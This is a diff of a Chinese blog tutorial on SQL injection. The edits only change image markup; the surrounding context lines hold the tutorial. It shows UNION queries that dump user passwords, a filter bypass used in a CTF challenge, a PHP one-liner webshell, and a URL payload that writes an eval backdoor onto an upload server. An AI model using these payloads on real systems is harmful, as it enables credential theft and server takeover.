@@ -192,7 +192,10 @@
 <li>数据访问层（Data access layer）</li>
 </ul>
 <p>区分层次的目的即为了”高内聚低耦合”的思想。在软件体系架构设计中，分层式结构是最常见，也是最重要的一种结构被应用于众多类型的软件开发：</p>
-<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-22%20%E4%B8%8B%E5%8D%8810.44.48.png" alt="屏幕快照 2017-09-22 下午10.44.48.png"></p>
+<figure class="image-box">
+                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-22%20%E4%B8%8B%E5%8D%8810.44.48.png" alt="屏幕快照 2017-09-22 下午10.44.48.png" title="" class="">
+                <p>屏幕快照 2017-09-22 下午10.44.48.png</p>
+            </figure>
 <p>在上图中，用户访问实验楼主页进行了如下过程：</p>
 <ul>
 <li>在 Web 浏览器中输入 <code>www.shiyanlou.com</code> 连接到实验楼服务器。</li>
@@ -219,7 +222,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECT userName FROM users WHERE user_id = &apos;1&apos; union select database(),user()#;</div><div class="line">#比如利用union语句来拼接多条查询语句,获取当前查询的用户名</div></pre></td></tr></table></figure>
 <p>当然这些信息都没有什么卵用，接下来直接上一个重量级的，爆出它所有的账号密码吧：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select userName from users where user_id = &apos;1&apos; union select user,password from users;</div></pre></td></tr></table></figure>
-<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-22%20%E4%B8%8B%E5%8D%8811.24.40.png" alt="屏幕快照 2017-09-22 下午11.24.40.png"></p>
+<figure class="image-box">
+                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-22%20%E4%B8%8B%E5%8D%8811.24.40.png" alt="屏幕快照 2017-09-22 下午11.24.40.png" title="" class="">
+                <p>屏幕快照 2017-09-22 下午11.24.40.png</p>
+            </figure>
 <p>虽然密码使用md5加密过了，但是这种玩意去网上随便找个在线工具就破开了，还是挺有意思</p>
 <h4 id="注入实例之验证绕过"><a href="#注入实例之验证绕过" class="headerlink" title="注入实例之验证绕过"></a>注入实例之验证绕过</h4><p>接下来再来试试一个利用SQL漏洞绕过登陆验证的实验，如果我们不知道登陆的话干脆就不要理他好了，悄悄的从旁边绕过去～</p>
 <p>这种情况下后台的代码验证类似于这种情况：</p>
@@ -243,7 +249,10 @@
 <p>判断SQL注入类型</p>
 </blockquote>
 <p>其实所有的类型都是根据数据库本身表的类型所产生的，在我们创建表的时候会发现其后总有个数据类型的限制，而不同的数据库又有不同的数据类型，但是无论怎么分<strong>常用</strong>的查询数据类型总是以数字与字符来区分的，所以就会产生注入点为何种类型。</p>
-<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-24%20%E4%B8%8B%E5%8D%8811.01.27.png" alt="屏幕快照 2017-09-24 下午11.01.27.png"></p>
+<figure class="image-box">
+                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-24%20%E4%B8%8B%E5%8D%8811.01.27.png" alt="屏幕快照 2017-09-24 下午11.01.27.png" title="" class="">
+                <p>屏幕快照 2017-09-24 下午11.01.27.png</p>
+            </figure>
 <ul>
 <li>字符型</li>
 </ul>
@@ -270,8 +279,14 @@
 <li>Url 地址中继续输入 <code>http://xxx/abc.php?id= x and 1=2</code> 页面运行错误，则说明此 Sql 注入为数字型注入。</li>
 </ol>
 <p>至于后台执行的SQL语句可以直接参考字符型的。</p>
-<h2 id="SQL注入实战"><a href="#SQL注入实战" class="headerlink" title="SQL注入实战"></a>SQL注入实战</h2><h3 id="实战一"><a href="#实战一" class="headerlink" title="实战一"></a>实战一</h3><p>刚刚点进去的时候如右图所示：<img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8A%E5%8D%8812.23.25.png" alt="屏幕快照 2017-09-25 上午12.23.25.png"></p>
-<p> 1.为了知道到底传递了什么参数，我们输入了1并提交，然后发现了<img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8A%E5%8D%8812.24.49.png" alt="屏幕快照 2017-09-25 上午12.24.49.png"></p>
+<h2 id="SQL注入实战"><a href="#SQL注入实战" class="headerlink" title="SQL注入实战"></a>SQL注入实战</h2><h3 id="实战一"><a href="#实战一" class="headerlink" title="实战一"></a>实战一</h3><p>刚刚点进去的时候如右图所示：<figure class="image-box">
+                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8A%E5%8D%8812.23.25.png" alt="屏幕快照 2017-09-25 上午12.23.25.png" title="" class="">
+                <p>屏幕快照 2017-09-25 上午12.23.25.png</p>
+            </figure></p>
+<p> 1.为了知道到底传递了什么参数，我们输入了1并提交，然后发现了<figure class="image-box">
+                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8A%E5%8D%8812.24.49.png" alt="屏幕快照 2017-09-25 上午12.24.49.png" title="" class="">
+                <p>屏幕快照 2017-09-25 上午12.24.49.png</p>
+            </figure></p>
 <p> 2.而在输入1’的时候报错，所以判断存在注入点，因为需要获得flag值，初步预估后台存储flag的表应该为flag,所以需要构造一条语句来查询</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select flag from flag</div></pre></td></tr></table></figure>
 <p> 3.根据第二步的报错信息看，多加个‘，后面的语句需要再构造一个条件来结束’，注入语句为：1’  union select flag from flag where ‘t’=’t</p>
@@ -282,7 +297,10 @@
 <p> 5.使用+号在空格之前连接(在url中进行拼接)：</p>
 <p>1’+unionunion +selectselect +flag+fromfrom +flag+wherewhere+’t’=’t</p>
 <p>这样的话就可以提交成功了，这种事情比较需要坚持不懈的毅力，半途而废是找不到漏洞的！</p>
-<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8A%E5%8D%8812.37.50.png" alt="屏幕快照 2017-09-25 上午12.37.50.png"></p>
+<figure class="image-box">
+                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8A%E5%8D%8812.37.50.png" alt="屏幕快照 2017-09-25 上午12.37.50.png" title="" class="">
+                <p>屏幕快照 2017-09-25 上午12.37.50.png</p>
+            </figure>
 <h4 id="实战二"><a href="#实战二" class="headerlink" title="实战二"></a>实战二</h4><p>今天为了检测一个文件上传下载的应用有没有漏洞，所以就对它进行了一下基本的注入，果然是有漏洞的hhh，虽然这个并不是SQL注入的漏洞，但是在这里也可以拿出来说一下，说到文件上传，大家首先想到的自然是文件包含漏洞，我首先构造的是一个隐蔽的php一句话木马：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$_GET[<span class="string">'a'</span>]($_GET[<span class="string">'code'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
 <p>然后尝试着上传这个文件,emmmm，并没有对上传的文件类型做限制，所以很轻松的就上传了上去，接下来就可以通过工具（或者社工）找到上传文件的路径，然后执行这个php脚本，手动的去拼接参数：</p>
@@ -290,7 +308,10 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/python</span></div><div class="line"><span class="comment">#encoding=utf-8</span></div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64_url_decode</span><span class="params">(string)</span>:</span></div><div class="line">    <span class="comment"># 通过url传输时去掉了=号，所以需要补上=号</span></div><div class="line">    <span class="keyword">return</span> base64.urlsafe_b64decode(str(string + <span class="string">'='</span> * (<span class="number">4</span> - len(string) % <span class="number">4</span>)))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64_url_encode</span><span class="params">(string)</span>:</span></div><div class="line">    <span class="keyword">return</span> base64.urlsafe_b64encode(str(string)).rstrip(<span class="string">'='</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    s=raw_input(<span class="string">'please input the type--&gt;encode/decode:\n'</span>)</div><div class="line">    <span class="keyword">if</span> s==<span class="string">'encode'</span>:</div><div class="line">        r=raw_input(<span class="string">'please input the string you want to encode:'</span>)</div><div class="line">        r=base64_url_encode(r)</div><div class="line">        print(r)</div><div class="line">    <span class="keyword">elif</span> s==<span class="string">'decode'</span>:</div><div class="line">        r=raw_input(<span class="string">'please input the string you want to decode:'</span>)</div><div class="line">        r=base64_url_decode(r)</div><div class="line">        print(r)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(<span class="string">'fuck you!!!\nasshole!\ndon’t you know english?'</span>)</div></pre></td></tr></table></figure>
 <p>这样一来，我们就可以用这个工具在执行脚本的时候传递我们所需要的参数了，比如说创建一个hack.php的文件，在url中可以进行这样的拼接：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id?a=assert&amp;code=$&#123;fputs%28fopen%28base64_decode%28aGFjay5waHA%29,w%29,base64 _decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgIGVjaG8iPGgxPnlvdSBhcmUgaGFja2VkPC9oMT4iPz4%29%29&#125;;</div></pre></td></tr></table></figure>
-<p>当你访问的时候效果就是：<img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8B%E5%8D%885.25.52.png" alt="屏幕快照 2017-09-25 下午5.25.52.png"></p>
+<p>当你访问的时候效果就是：<figure class="image-box">
+                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8B%E5%8D%885.25.52.png" alt="屏幕快照 2017-09-25 下午5.25.52.png" title="" class="">
+                <p>屏幕快照 2017-09-25 下午5.25.52.png</p>
+            </figure></p>
 <p>当然你可以传递进去参数把它文件删除也是可以的，平时在写应用的时候还是要多考虑一下安全问题呀。</p>
 
         </div>
